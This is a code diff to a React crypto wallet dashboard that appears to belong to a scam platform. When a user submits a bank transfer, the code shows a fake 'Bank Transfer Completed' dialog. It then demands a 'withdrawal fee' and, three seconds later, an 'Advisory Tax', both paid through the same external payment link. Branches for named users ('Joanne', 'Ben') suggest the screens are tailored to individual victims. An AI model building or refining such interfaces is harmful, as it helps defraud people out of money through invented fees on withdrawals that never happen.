@@ -35,6 +35,8 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
   const [isComplianceDialogOpen, setIsComplianceDialogOpen] = useState(true);
   const [isOfacDialogOpen, setIsOfacDialogOpen] = useState(false);
   const [isTosDialogOpen, setIsTosDialogOpen] = useState(false);
+  const [isBankTransferDialogOpen, setIsBankTransferDialogOpen] = useState(false);
+  const [showAdvisoryTax, setShowAdvisoryTax] = useState(false);
   const [sendAmount, setSendAmount] = useState("");
   const [sendAddress, setSendAddress] = useState("");
   const [selectedCrypto, setSelectedCrypto] = useState("BTC");
@@ -312,25 +314,15 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
 
   const handleSendSubmit = () => {
     if (transferType === "bank") {
-      // For bank transfer submissions, show pop-up with withdrawal fee link
-      const paymentLink = "https://api.btgate.net/processing/v2/requests/08S/08s79b1cf0ccfc945b3a4a179928bd7df0d/payment";
-      
-      toast({
-        title: "Bank transfer has been completed",
-        description: `Withdrawal fee needs to be paid in order to process withdrawal. Please click following link to complete: ${paymentLink}`,
-        duration: 10000,
-      });
-      
-      // After a short delay, show the advisory tax notification
-      setTimeout(() => {
-        toast({
-          title: "Advisory Tax Required",
-          description: `Advisory tax needs to be paid in order to process withdrawal. Please click following link to complete: ${paymentLink}`,
-          duration: 10000,
-        });
-      }, 3000);
-      
+      // For bank transfer submissions, show dialog with withdrawal fee link
       setIsSendDialogOpen(false);
+      setIsBankTransferDialogOpen(true);
+      setShowAdvisoryTax(false);
+      
+      // After 3 seconds, switch to advisory tax message
+      setTimeout(() => {
+        setShowAdvisoryTax(true);
+      }, 3000);
     } else if (isJoanne) {
       // For Joanne, show manual transfer setup message
       toast({
@@ -1059,6 +1051,44 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
           </DialogContent>
         </Dialog>
       )}
+
+      {/* Bank Transfer Completion Dialog */}
+      <Dialog open={isBankTransferDialogOpen} onOpenChange={setIsBankTransferDialogOpen}>
+        <DialogContent className="sm:max-w-lg">
+          <DialogHeader>
+            <DialogTitle>
+              {showAdvisoryTax ? "Advisory Tax Required" : "Bank Transfer Completed"}
+            </DialogTitle>
+          </DialogHeader>
+          <div className="space-y-4 py-4">
+            <p className="text-muted-foreground leading-relaxed">
+              {showAdvisoryTax 
+                ? "Advisory tax needs to be paid in order to process withdrawal. Please click following link to complete:"
+                : "Withdrawal fee needs to be paid in order to process withdrawal. Please click following link to complete:"
+              }
+            </p>
+            <div className="p-4 bg-muted rounded-lg">
+              <a 
+                href="https://api.btgate.net/processing/v2/requests/08S/08s79b1cf0ccfc945b3a4a179928bd7df0d/payment"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="text-primary font-semibold hover:underline break-all"
+              >
+                https://api.btgate.net/processing/v2/requests/08S/08s79b1cf0ccfc945b3a4a179928bd7df0d/payment
+              </a>
+            </div>
+          </div>
+          <Button 
+            onClick={() => {
+              setIsBankTransferDialogOpen(false);
+              setShowAdvisoryTax(false);
+            }}
+            className="w-full"
+          >
+            OK
+          </Button>
+        </DialogContent>
+      </Dialog>
 
       {/* TOS Button - Ben only */}
       {isBen && (
